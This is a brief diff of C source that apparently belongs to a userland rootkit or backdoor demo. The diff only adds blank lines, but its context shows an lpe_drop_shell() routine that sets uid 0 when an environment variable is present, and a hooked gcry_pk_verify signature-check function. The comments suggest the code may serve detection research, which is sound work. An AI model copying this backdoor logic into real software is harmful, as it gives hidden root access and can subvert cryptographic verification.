@@ -22,6 +22,7 @@ void lpe_drop_shell() {
 	#ifdef DEBUG
 	fprintf(stderr, "lpe_drop_shell() called!\n");
 	#endif
+
 	if (geteuid() == 0 && getenv(ENV)) {
 		setuid(0);
 		seteuid(0);
@@ -116,8 +117,10 @@ gcry_error_t gcry_pk_verify(gcry_sexp_t sig, gcry_sexp_t data, gcry_sexp_t pkey)
  * Unsafe demo function. Used for detection.
 */
 char *strfry(char * string){
+
 	#ifdef DEBUG
 	fprintf(stderr, "strfry() called!\n");
 	#endif
+
 	return strcpy(string, STRING);
 }
